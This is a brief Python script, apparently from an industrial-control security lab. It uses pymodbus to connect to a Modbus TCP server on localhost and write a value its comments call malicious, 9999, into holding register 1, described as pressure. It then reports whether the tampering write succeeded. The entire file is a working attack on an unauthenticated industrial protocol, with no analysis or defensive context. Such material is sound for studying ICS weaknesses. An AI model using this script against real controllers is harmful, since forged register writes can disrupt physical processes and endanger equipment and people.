from pymodbus.client import ModbusTcpClient

# Step 1 connect to the client

client = ModbusTcpClient('localhost', port = 5020)

if not client.connect():
	print("couldn't able to connect to server")
	exit(1)
	
print("Connection established successfully!!")

# Write the malicious value to HR[1] , pressure

target_number = 1
malicious_value = 9999

response = client.write_register(address = target_number, value = malicious_value, slave = 1)


#Check if the write is succeeded

if response.isError():
	print("Write failed or denied by the server")
else:
	print(f" Malicious write succeeded: HR[{target_number}] = {malicious_value}")

client.close()
